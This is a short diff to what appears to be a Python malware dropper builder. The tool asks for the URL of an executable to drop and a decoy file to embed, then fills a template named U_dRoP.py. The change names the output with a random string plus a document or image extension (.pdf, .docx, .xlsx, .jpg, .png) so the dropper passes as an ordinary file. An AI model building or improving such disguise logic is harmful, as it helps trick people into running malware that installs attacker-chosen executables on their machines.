@@ -85,7 +85,16 @@ def begin():
     print '\n[*] Remember to include the http or https.\n'
     url_d = raw_input('Insert url from your exe to drop: ')
     embed_d = raw_input('Insert url from file to embed: ')
-    nameph = randomword(10)
+    if 'pdf' in embed_d:
+        nameph = randomword(10) + '.pdf'
+    if 'docx' in embed_d:
+        nameph = randomword(10) + '.docx'
+    if 'xlsx' in embed_d:
+        nameph = randomword(10) + '.xlsx'
+    if 'jpg' in embed_d:
+        nameph = randomword(10) + '.jpg'
+    if 'png' in embed_d:
+        nameph = randomword(10) + '.png'
     template = open('Templates/U_dRoP.py', 'r')
     o = template.read()
 
